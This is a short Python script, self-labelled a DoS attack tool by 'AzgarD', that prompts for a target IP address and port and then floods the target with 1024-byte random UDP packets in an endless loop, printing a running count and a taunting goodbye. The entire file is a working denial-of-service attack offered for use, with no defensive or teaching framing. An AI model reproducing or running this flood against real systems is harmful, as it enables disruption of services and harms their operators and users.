#!/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random
import colorama
from colorama import Fore, Back, init
import emoji

#This is a DoS script.
#Okidoki?

pab = random._urandom(1024)
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
colorama.init(autoreset=True)
sent = 0

os.system("clear")
print Fore.RED +"""

 /$$$$$$$  /$$$$$$  /$$$$$$ 
| $$__  $$/$$__  $$/$$__  $$
| $$  \ $| $$  \ $| $$  \__/
| $$  | $| $$  | $|  $$$$$$ 
| $$  | $| $$  | $$\____  $$
| $$  | $| $$  | $$/$$  \ $$
| $$$$$$$|  $$$$$$|  $$$$$$/
|_______/ \______/ \______/ """

try:
	print(Fore.GREEN + "\nDoS Attack Made By AzgarD.")
	print("")
	print(emoji.emojize(Fore.RED + "DoS made with :red_heart:\n",variant="emoji_type"))
	ip = raw_input(Fore.BLUE + "└──╼> Select the ip address: ")
	port = int(input(Fore.BLUE + "└──╼> Select the port: "))
except KeyboardInterrupt:
	print(Fore.RED + "\nERROR INTEERUPTION DETECTED.")
	sys.exit()
except SyntaxError:
	print(Fore.RED + "\nERROR A SYNTAX ERROR OCCURED, PLEASE USE THE install.sh TO PROPER INSTALLATION.")
	sys.exit()
except ImportError:
	print(Fore.RED + "\nERROR PLEASE USE PYTHON3.")
	sys.exit()
except NameError:
	print(Fore.RED + "INVALID INPUT.")
	sys.exit()

os.system("clear")
print(Fore.RED + "GOOD BYE %s :)"%ip)
time.sleep(3)
os.system("clear")

while True:
	try:
		client.sendto(pab, (ip, port))
		sent = sent + 1
		print(emoji.emojize(Fore.RED + "SENDED %s PACKEGES TO %s AT PORT %s :red_heart:")%(sent, ip, port))
		time.sleep(0.0000001)
	except KeyboardInterrupt:
		print(Fore.RED + "\nERROR INTEERUPTION DETECTED.\n")
		sys.exit()
